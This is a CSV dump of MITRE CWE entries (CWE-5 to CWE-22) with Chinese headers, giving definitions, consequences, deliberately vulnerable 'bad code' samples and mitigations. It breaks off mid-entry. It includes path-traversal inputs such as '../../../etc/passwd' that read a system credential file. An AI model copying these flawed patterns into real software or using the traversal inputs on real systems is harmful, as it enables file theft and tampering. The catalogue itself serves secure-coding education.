cwe_vulnerabilities
名称,定义,常见后果,示范例子,可能的缓解方案
CWE CATEGORY: DEPRECATED: Location,"This category has been deprecated. It was originally used for organizing the Development View (CWE-699), but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: 7PK - Environment,"This category represents one of the phyla in the Seven Pernicious Kingdoms vulnerability classification. It includes weaknesses that are typically introduced during unexpected environmental conditions. According to the authors of the Seven Pernicious Kingdoms, ""This section includes everything that is outside of the source code but is still critical to the security of the product that is being created. Because the issues covered by this kingdom are not directly related to source code, we separated it from the rest of the kingdoms.""",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: DEPRECATED: Technology-specific Environment Issues,"This category has been deprecated. It was originally intended as a ""catch-all"" for environment issues for technologies that did not have their own CWE, but it introduced unnecessary depth and complexity to the Development View (CWE-699).",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: DEPRECATED: J2EE Environment Issues,"This entry has been deprecated. It was originally used for organizing the Development View (CWE-699) and some other views, but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-5: J2EE Misconfiguration: Data Transmission Without Encryption,Information sent over a network can be compromised while in transit. An attacker may be able to read or modify the contents if the data are sent in plaintext or are weakly encrypted.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Application Data, Likelihood: ",无示范例子,Phase:  System ConfigurationThe product configuration should ensure that SSL or an encryption mechanism of equivalent strength and vetted reputation is used for all access-controlled pages.
CWE-6: J2EE Misconfiguration: Insufficient Session-ID Length,The J2EE application is configured to use an insufficient session ID length.,"Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityIf an attacker can guess an authenticated user's session identifier, they can take over the user's session., Likelihood: ","Example 1The following XML example code is a deployment descriptor for a Java web application deployed on a Sun Java Application Server. This deployment descriptor includes a session configuration property for configuring the session ID length.(bad code)Example Language:XML<sun-web-app>...<session-config><session-properties><property name=""idLengthBytes"" value=""8""><description>The number of bytes in this web module's session ID.</description></property></session-properties></session-config>...</sun-web-app>This deployment descriptor has set the session ID length for this Java web application to 8 bytes (or 64 bits). The session ID length for Java web applications should be set to 16 bytes (128 bits) to prevent attackers from guessing and/or stealing a session ID and taking over a user's session.Note for most application servers including the Sun Java Application Server the session ID length is by default set to 128 bits and should not be changed. And for many application servers the session ID length cannot be changed from this default setting. Check your application server documentation for the session ID length default setting and configuration options to ensure that the session ID length is set to 128 bits.","Phase:  ImplementationSession identifiers should be at least 128 bits long to prevent brute-force session guessing. A shorter session identifier leaves the application open to brute-force session guessing attacks.Phase:  ImplementationA lower bound on the number of valid session identifiers that are available to be guessed is the number of users that are active on a site at any given moment. However, any users that abandon their sessions without logging out will increase this number. (This is one of many good reasons to have a short inactive session timeout.) With a 64 bit session identifier, assume 32 bits of entropy. For a large web site, assume that the attacker can try 1,000 guesses per second and that there are 10,000 valid session identifiers at any given moment. Given these assumptions, the expected time for an attacker to successfully guess a valid session identifier is less than 4 minutes. Now assume a 128 bit session identifier that provides 64 bits of entropy. With a very large web site, an attacker might try 10,000 guesses per second with 100,000 valid session identifiers available to be guessed. Given these assumptions, the expected time for an attacker to successfully guess a valid session identifier is greater than 292 years."
CWE-7: J2EE Misconfiguration: Missing Custom Error Page,The default error page of a web application should not display sensitive information about the product.,"Scope: Confidentiality, Impact: Technical Impact:Read Application DataA stack trace might show the attacker a malformed SQL query string, the type of database being used, and the version of the application container. This information enables the attacker to target known vulnerabilities in these components., Likelihood: ","Example 1In the snippet below, an unchecked runtime exception thrown from within the try block may cause the container to display its default error page (which may contain a full stack trace, among other things).(bad code)Example Language:JavaPublic void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {try {...} catch (ApplicationSpecificException ase) {logger.error(""Caught: "" + ase.toString());}}","Phase:  ImplementationHandle exceptions appropriately in source code.Phases:  Implementation; System ConfigurationAlways define appropriate error pages. The application configuration should specify a default error page in order to guarantee that the application will never leak error messages to an attacker. Handling standard HTTP error codes is useful and user-friendly in addition to being a good security practice, and a good configuration will also define a last-chance error handler that catches any exception that could possibly be thrown by the application.Phase:  ImplementationDo not attempt to process an error or attempt to mask it.Phase:  ImplementationVerify return values are correct and do not supply sensitive information about the system."
CWE-8: J2EE Misconfiguration: Entity Bean Declared Remote,"When an application exposes a remote interface for an entity bean, it might also expose methods that get or set the bean's data. These methods could be leveraged to read sensitive information, or to change data in ways that violate the application's expectations, potentially leading to other vulnerabilities.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Application Data; Modify Application Data, Likelihood: ",Example 1The following example demonstrates the weakness.(bad code)Example Language:XML<ejb-jar><enterprise-beans><entity><ejb-name>EmployeeRecord</ejb-name><home>com.wombat.empl.EmployeeRecordHome</home><remote>com.wombat.empl.EmployeeRecord</remote>...</entity>...</enterprise-beans></ejb-jar>,"Phase:  ImplementationDeclare Java beans ""local"" when possible. When a bean must be remotely accessible, make sure that sensitive information is not exposed, and ensure that the application logic performs appropriate validation of any data that might be modified by an attacker."
CWE-9: J2EE Misconfiguration: Weak Access Permissions for EJB Methods,"If elevated access rights are assigned to EJB methods, then an attacker can take advantage of the permissions to exploit the product.","Scope: Other, Impact: Technical Impact:Other, Likelihood: ",Example 1The following deployment descriptor grants ANYONE permission to invoke the Employee EJB's method named getSalary().(bad code)Example Language:XML<ejb-jar>...<assembly-descriptor><method-permission><role-name>ANYONE</role-name><method><ejb-name>Employee</ejb-name><method-name>getSalary</method-name></method-permission></assembly-descriptor>...</ejb-jar>,Phases:  Architecture and Design; System ConfigurationFollow the principle of least privilege when assigning access rights to EJB methods. Permission to invoke EJB methods should not be granted to the ANYONE role.
CWE CATEGORY: DEPRECATED: ASP.NET Environment Issues,This category has been deprecated. It added unnecessary depth and complexity to its associated views.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-11: ASP.NET Misconfiguration: Creating Debug Binary,Debugging messages help attackers learn about the system and plan a form of attack.,"Scope: Confidentiality, Impact: Technical Impact:Read Application DataAttackers can leverage the additional information they gain from debugging output to mount attacks targeted on the framework, database, or other resources used by the application., Likelihood: ","Example 1The file web.config contains the debug mode setting. Setting debug to ""true"" will let the browser display debugging information.(bad code)Example Language:XML<?xml version=""1.0"" encoding=""utf-8"" ?><configuration><system.web><compilationdefaultLanguage=""c#""debug=""true""/>...</system.web></configuration>Change the debug mode to false when the application is deployed into production.",Phase:  System ConfigurationAvoid releasing debug binaries into the production environment. Change the debug mode to false when the application is deployed into production.
CWE-12: ASP.NET Misconfiguration: Missing Custom Error Page,An ASP .NET application must enable custom error pages in order to prevent attackers from mining information from the framework's built-in responses.,"Scope: Confidentiality, Impact: Technical Impact:Read Application DataDefault error pages gives detailed information about the error that occurred, and should not be used in production environments. Attackers can leverage the additional information provided by a default error page to mount attacks targeted on the framework, database, or other resources used by the application., Likelihood: ","Example 1The mode attribute of the <customErrors> tag in the Web.config file defines whether custom or default error pages are used.In the following insecure ASP.NET application setting, custom error message mode is turned off. An ASP.NET error message with detailed stack trace and platform versions will be returned.(bad code)Example Language:ASP.NET<customErrors mode=""Off"" />A more secure setting is to set the custom error message mode for remote users only. No defaultRedirect error page is specified. The local user on the web server will see a detailed stack trace. For remote users, an ASP.NET error message with the server customError configuration setting and the platform version will be returned.(good code)Example Language:ASP.NET<customErrors mode=""RemoteOnly"" />Another secure option is to set the mode attribute of the <customErrors> tag to use a custom page as follows:(good code)Example Language:ASP.NET<customErrors mode=""On"" defaultRedirect=""YourErrorPage.htm"" />",Phase:  System ConfigurationHandle exceptions appropriately in source code. ASP .NET applications should be configured to use custom error pages instead of the framework default page.Phase:  Architecture and DesignDo not attempt to process an error or attempt to mask it.Phase:  ImplementationVerify return values are correct and do not supply sensitive information about the system.
CWE-13: ASP.NET Misconfiguration: Password in Configuration File,Storing a plaintext password in a configuration file allows anyone who can read the file access to the password-protected resource making them an easy target for attackers.,"Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity, Likelihood: ","Example 1The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database, but the pair is stored in plaintext.(bad code)Example Language:ASP.NET...<connectionStrings><add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" /></connectionStrings>...Username and password information should not be included in a configuration file or a properties file in plaintext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.","Phase:  ImplementationCredentials stored in configuration files should be encrypted, Use standard APIs and industry accepted algorithms to encrypt the credentials stored in configuration files."
CWE-14: Compiler Removal of Code to Clear Buffers,"Sensitive memory is cleared according to the source code, but compiler optimizations leave the memory untouched when it is not read from again, aka ""dead store removal.""","Scope: ConfidentialityAccess Control, Impact: Technical Impact:Read Memory; Bypass Protection MechanismThis weakness will allow data that has not been cleared from memory to be read. If this data contains sensitive password information, then an attacker can read the password and use the information to bypass protection mechanisms., Likelihood: ","Example 1The following code reads a password from the user, uses the password to connect to a back-end mainframe and then attempts to scrub the password from memory using memset().(bad code)Example Language:Cvoid GetData(char *MFAddr) {char pwd[64];if (GetPasswordFromUser(pwd, sizeof(pwd))) {if (ConnectToMainframe(MFAddr, pwd)) {// Interaction with mainframe}}memset(pwd, 0, sizeof(pwd));}The code in the example will behave correctly if it is executed verbatim, but if the code is compiled using an optimizing compiler, such as Microsoft Visual C++ .NET or GCC 3.x, then the call to memset() will be removed as a dead store because the buffer pwd is not used after its value is overwritten [18]. Because the buffer pwd contains a sensitive value, the application may be vulnerable to attack if the data are left memory resident. If attackers are able to access the correct region of memory, they may use the recovered password to gain control of the system.It is common practice to overwrite sensitive data manipulated in memory, such as passwords or cryptographic keys, in order to prevent attackers from learning system secrets. However, with the advent of optimizing compilers, programs do not always behave as their source code alone would suggest. In the example, the compiler interprets the call to memset() as dead code because the memory being written to is not subsequently used, despite the fact that there is clearly a security motivation for the operation to occur. The problem here is that many compilers, and in fact many programming languages, do not take this and other security concerns into consideration in their efforts to improve efficiency.Attackers typically exploit this type of vulnerability by using a core dump or runtime mechanism to access the memory used by a particular application and recover the secret information. Once an attacker has access to the secret information, it is relatively straightforward to further exploit the system and possibly compromise other resources with which the application interacts.","Phase:  ImplementationStore the sensitive data in a ""volatile"" memory location if available.Phase:  Build and CompilationIf possible, configure your compiler so that it does not remove dead stores.Phase:  Architecture and DesignWhere possible, encrypt sensitive data that are used by a software system."
CWE-15: External Control of System or Configuration Setting,One or more system settings or configuration elements can be externally controlled by a user.,"Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ","Example 1The following C code accepts a number as one of its command line parameters and sets it as the host ID of the current machine.(bad code)Example Language:C...sethostid(argv[1]);...Although a process must be privileged to successfully invoke sethostid(), unprivileged users may be able to invoke the program. The code in this example allows user input to directly control the value of a system setting. If an attacker provides a malicious value for host ID, the attacker can misidentify the affected machine on the network or cause other unintended behavior.Example 2The following Java code snippet reads a string from an HttpServletRequest and sets it as the active catalog for a database Connection.(bad code)Example Language:Java...conn.setCatalog(request.getParameter(""catalog""));...In this example, an attacker could cause an error by providing a nonexistent catalog name or connect to an unauthorized portion of the database.","Phase:  Architecture and DesignStrategy:  Separation of PrivilegeCompartmentalize the system to have ""safe"" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.Phases:  Implementation; Architecture and DesignBecause setting manipulation covers a diverse set of functions, any attempt at illustrating it will inevitably be incomplete. Rather than searching for a tight-knit relationship between the functions addressed in the setting manipulation category, take a step back and consider the sorts of system values that an attacker should not be allowed to control.Phases:  Implementation; Architecture and DesignIn general, do not allow user-provided or otherwise untrusted data to control sensitive values. The leverage that an attacker gains by controlling these values is not always immediately obvious, but do not underestimate the creativity of the attacker."
CWE CATEGORY: Configuration,Weaknesses in this category are typically introduced during the configuration of the software.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: DEPRECATED: Code,"This entry has been deprecated. It was originally used for organizing the Development View (CWE-699) and some other views, but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: DEPRECATED: Source Code,"This entry has been deprecated. It was originally used for organizing the Development View (CWE-699) and some other views, but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Data Processing Errors,Weaknesses in this category are typically found in functionality that processes data. Data processing is the manipulation of input to retrieve or save information.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-20: Improper Input Validation,"The product receives input or data, but it does not validate or incorrectly validates that the input has the properties that are required to process the data safely and correctly.","Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or Restart; DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory)An attacker could provide unexpected values and cause a program crash or excessive consumption of resources, such as memory and CPU., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Memory; Read Files or DirectoriesAn attacker could read confidential data if they are able to control resource references., Likelihood: ; Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Modify Memory; Execute Unauthorized Code or CommandsAn attacker could use malicious input to modify data or possibly alter control flow in unexpected ways, including arbitrary command execution., Likelihood: ","Example 1This example demonstrates a shopping interaction in which the user is free to specify the quantity of items to be purchased and a total is calculated.(bad code)Example Language:Java...public static final double price = 20.00;int quantity = currentUser.getAttribute(""quantity"");double total = price * quantity;chargeUser(total);...The user has no control over the price variable, however the code does not prevent a negative value from being specified for quantity. If an attacker were to provide a negative value, then the user would have their account credited instead of debited.Example 2This example asks the user for a height and width of an m X n game board with a maximum dimension of 100 squares.(bad code)Example Language:C...#define MAX_DIM 100.../* board dimensions */int m,n, error;board_square_t *board;printf(""Please specify the board height: \n"");error = scanf(""%d"", &m);if ( EOF == error ){die(""No integer passed: Die evil hacker!\n"");}printf(""Please specify the board width: \n"");error = scanf(""%d"", &n);if ( EOF == error ){die(""No integer passed: Die evil hacker!\n"");}if ( m > MAX_DIM || n > MAX_DIM ) {die(""Value too large: Die evil hacker!\n"");}board = (board_square_t*) malloc( m * n * sizeof(board_square_t));...While this code checks to make sure the user cannot specify large, positive integers and consume too much memory, it does not check for negative values supplied by the user. As a result, an attacker can perform a resource consumption (CWE-400) attack against this program by specifying two, large negative values that will not overflow, resulting in a very large memory allocation (CWE-789) and possibly a system crash. Alternatively, an attacker can provide very large negative values which will cause an integer overflow (CWE-190) and unexpected behavior will follow depending on how the values are treated in the remainder of the program.Example 3The following example shows a PHP application in which the programmer attempts to display a user's birthday and homepage.(bad code)Example Language:PHP$birthday = $_GET['birthday'];$homepage = $_GET['homepage'];echo ""Birthday: $birthday<br>Homepage: <a href=$homepage>click here</a>""The programmer intended for $birthday to be in a date format and $homepage to be a valid URL. However, since the values are derived from an HTTP request, if an attacker can trick a victim into clicking a crafted URL with <script> tags providing the values for birthday and / or homepage, then the script will run on the client's browser when the web server echoes the content. Notice that even if the programmer were to defend the $birthday variable by restricting input to integers and dashes, it would still be possible for an attacker to provide a string of the form:(attack code)2009-01-09--If this data were used in a SQL statement, it would treat the remainder of the statement as a comment. The comment could disable other security-related logic in the statement. In this case, encoding combined with input validation would be a more useful protection mechanism.Furthermore, an XSS (CWE-79) attack or SQL injection (CWE-89) are just a few of the potential consequences when input validation is not used. Depending on the context of the code, CRLF Injection (CWE-93), Argument Injection (CWE-88), or Command Injection (CWE-77) may also be possible.Example 4The following example takes a user-supplied value to allocate an array of objects and then operates on the array.(bad code)Example Language:Javaprivate void buildList ( int untrustedListSize ){if ( 0 > untrustedListSize ){die(""Negative value supplied for list size, die evil hacker!"");}Widget[] list = new Widget [ untrustedListSize ];list[0] = new Widget();}This example attempts to build a list from a user-specified value, and even checks to ensure a non-negative value is supplied. If, however, a 0 value is provided, the code will build an array of size 0 and then try to store a new Widget in the first location, causing an exception to be thrown.Example 5This Android application has registered to handle a URL when sent an intent:(bad code)Example Language:Java...IntentFilter filter = new IntentFilter(""com.example.URLHandler.openURL"");MyReceiver receiver = new MyReceiver();registerReceiver(receiver, filter);...public class UrlHandlerReceiver extends BroadcastReceiver {@Overridepublic void onReceive(Context context, Intent intent) {if(""com.example.URLHandler.openURL"".equals(intent.getAction())) {String URL = intent.getStringExtra(""URLToOpen"");int length = URL.length();...}}}The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called.","Phase:  Architecture and DesignStrategy:  Attack Surface ReductionConsider using language-theoretic security (LangSec) techniques that characterize inputs using a formal language and build ""recognizers"" for that language. This effectively requires parsing to be a distinct layer that effectively enforces a boundary between raw input and internal data representations, instead of allowing parser code to be scattered throughout the program, where it could be subject to errors or inconsistencies that create weaknesses. [REF-1109] [REF-1110] [REF-1111]Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse an input validation framework such as Struts or the OWASP ESAPI Validation API. Note that using a framework does not automatically address all input validation problems; be mindful of weaknesses that could arise from misusing the framework itself (CWE-1173).Phases:  Architecture and Design; ImplementationStrategy:  Attack Surface ReductionUnderstand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Effectiveness: HighPhase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoidCWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings.Phase:  ImplementationWhen your application combines data from multiple sources, perform the validation after the sources have been combined. The individual data elements may pass the validation step but violate the intended restrictions after they have been combined.Phase:  ImplementationBe especially careful to validate all input when invoking code that crosses language boundaries, such as from an interpreted language to native code. This could create an unexpected interaction between the language boundaries. Ensure that you are not violating any of the expectations of the language with which you are interfacing. For example, even though Java may not be susceptible to buffer overflows, providing a large argument in a call to native code might trigger an overflow.Phase:  ImplementationDirectly convert your input type into the expected data type, such as using a conversion function that translates a string into a number. After converting to the expected data type, ensure that the input's values fall within the expected range of allowable values and that multi-field consistencies are maintained.Phase:  ImplementationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180,CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass allowlist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.Phase:  ImplementationWhen exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so."
CWE CATEGORY: DEPRECATED: Pathname Traversal and Equivalence Errors,"This category has been deprecated. It was originally used for organizing weaknesses involving file names, which enabled access to files outside of a restricted directory (path traversal) or to perform operations on files that would otherwise be restricted (path equivalence). Consider using either the File Handling Issues category (CWE-1219) or the class Use of Incorrectly-Resolved Name or Reference (CWE-706).",无常见后果信息,无示范例子,无可能的缓解方案
CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'),"The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory.","Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsThe attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Files or DirectoriesThe attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Files or DirectoriesThe attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartThe attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the product from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the product., Likelihood: ","Example 1The following code could be for a social networking application in which each user's profile information is stored in a separate file. All files are stored in a single directory.(bad code)Example Language:Perlmy $dataPath = ""/users/cwe/profiles"";my $username = param(""user"");my $profilePath = $dataPath . ""/"" . $username;open(my $fh, ""<"", $profilePath) || ExitError(""profile read error: $profilePath"");print ""<ul>\n"";while (<$fh>) {print ""<li>$_</li>\n"";}print ""</ul>\n"";While the programmer intends to access files such as ""/users/cwe/profiles/alice"" or ""/users/cwe/profiles/bob"", there is no verification of the incoming user parameter. An attacker could provide a string such as:(attack code)../../../etc/passwdThe program would generate a profile pathname like this:(result)/users/cwe/profiles/../../../etc/passwdWhen the file is opened, the operating system resolves the ""../"" during path canonicalization and actually accesses this file:(result)/etc/passwdAs a result, the attacker could read the entire text of the password file.Notice how this code also contains an error message information leak (CWE-209) if the user parameter does not produce a file that exists: the full pathname is provided. Because of the lack of output encoding of the file that is retrieved, there might also be a cross-site scripting problem (CWE-79) if profile contains any HTML, but other code would need to be examined.Example 2In the example below, the path to a dictionary file is read from a system property and used to initialize a File object.(bad code)Example Language:JavaString filename = System.getProperty(""com.domain.application.dictionaryFile"");File dictionaryFile = new File(filename);However, the path is not validated or modified to prevent it from containing relative or absolute path sequences before creating the File object. This allows anyone who can control the system property to determine what file is used. Ideally, the path should be resolved relative to some kind of application or user home directory.Example 3The following code takes untrusted input and uses a regular expression to filter ""../"" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.(bad code)Example Language:Perlmy $Username = GetUntrustedInput();$Username =~ s/\.\.\///;my $filename = ""/home/user/"" . $Username;ReadAndSendFile($filename);Since the regular expression does not have the /g global match modifier, it only removes the first instance of ""../"" it comes across. So an input value such as:(attack code)../../../etc/passwdwill have the first ""../"" stripped, resulting in:(result)../../etc/passwdThis value is then concatenated with the /home/user/ directory:(result)/home/user/../../etc/passwdwhich causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23).Example 4The following code attempts to validate a given input path by checking it against an allowlist and once validated delete the given file. In this specific case, the path is considered valid if it starts with the string ""/safe_dir/"".(bad code)Example Language:JavaString path = getInputPath();if (path.startsWith(""/safe_dir/"")){File f = new File(path);f.delete()}An attacker could provide an input such as this:(attack code)/safe_dir/../important.datThe software assumes that the path is valid because it starts with the ""/safe_path/"" sequence, but the ""../"" sequence will cause the program to delete the important.dat file in the parent directoryExample 5The following code demonstrates the unrestricted upload of a file with a Java servlet and a path traversal vulnerability. The action attribute of an HTML form is sending the upload file request to the Java servlet.(good code)Example Language:HTML<form action=""FileUploadServlet"" method=""post"" enctype=""multipart/form-data"">Choose a file to upload:<input type=""file"" name=""filename""/><br/><input type=""submit"" name=""submit"" value=""Submit""/></form>When submitted the Java servlet's doPost method will receive the request, extract the name of the file from the Http request header, read the file contents from the request and output the file to the local upload directory.(bad code)Example Language:Javapublic class FileUploadServlet extends HttpServlet {...protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {response.setContentType(""text/html"");PrintWriter out = response.getWriter();String contentType = request.getContentType();// the starting position of the boundary headerint ind = contentType.indexOf(""boundary="");String boundary = contentType.substring(ind+9);String pLine = new String();String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value// verify that content type is multipart form dataif (contentType != null && contentType.indexOf(""multipart/form-data"") != -1) {// extract the filename from the Http headerBufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));...pLine = br.readLine();String filename = pLine.substring(pLine.lastIndexOf(""\\""), pLine.lastIndexOf(""\""""));...// output the file to the local upload directorytry {BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));for (String line; (line=br.readLine())!=null; ) {if (line.indexOf(boundary) == -1) {bw.write(line);bw.newLine();bw.flush();}} //end of for loopbw.close();} catch (IOException ex) {...}// output successful upload response HTML page}// output unsuccessful upload response HTML pageelse{...}}...}This code does not perform a check on the type of the file being uploaded (CWE-434). This could allow an attacker to upload any executable file or other file with malicious code.Additionally, the creation of the BufferedWriter object is subject to relative path traversal (CWE-23). Since the code does not check the filename that is provided in the header, an attacker can use ""../"" sequences to write to files outside of the intended directory. Depending on the executing environment, the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS (CWE-79), or system crash.Example 6This script intends to read a user-supplied file from the current directory. The user inputs the relative path to the file and the script uses Python's os.path.join() function to combine the path to the current working directory with the provided path to the specified file. This results in an absolute path to the desired file. If the file does not exist when the script attempts to read it, an error is printed to the user.(bad code)Example Language:Pythonimport osimport sysdef main():filename = sys.argv[1]path = os.path.join(os.getcwd(), filename)try:with open(path, 'r') as f:file_data = f.read()except FileNotFoundError as e:print(""Error - file not found"")main()However, if the user supplies an absolute path, the os.path.join() function will discard the path to the current working directory and use only the absolute path provided. For example, if the current working directory is /home/user/documents, but the user inputs /etc/passwd, os.path.join() will use only /etc/passwd, as it is considered an absolute path. In the above scenario, this would cause the script to access and read the /etc/passwd file.(good code)Example Language:Pythonimport osimport sysdef main():filename = sys.argv[1]path = os.path.normpath(f""{os.getcwd()}{os.sep}{filename}"")try:with open(path, 'r') as f:file_data = f.read()except FileNotFoundError as e:print(""Error - file not found"")main()The constructed path string uses os.sep to add the appropriate separation character for the given operating system (e.g. '\' or '/') and the call to os.path.normpath() removes any additional slashes that may have been entered - this may occur particularly when using a Windows path. By putting the pieces of the path string together in this fashion, the script avoids a call to os.path.join() and any potential issues that might arise if an absolute path is entered. With this version of the script, if the current working directory is /home/user/documents, and the user inputs /etc/passwd, the resulting path will be /home/user/documents/etc/passwd. The user is therefore contained within the current working directory as intended.","Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Phase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoidCWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes "".."" sequences and symbolic links (CWE-23,CWE-59). This includes:realpath() in CgetCanonicalPath() in JavaGetFullPath() in ASP.NETrealpath() or abs_path() in Perlrealpath() in PHPPhase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.Phase:  OperationStrategy:  FirewallUse an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.Effectiveness: ModerateNote:An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort 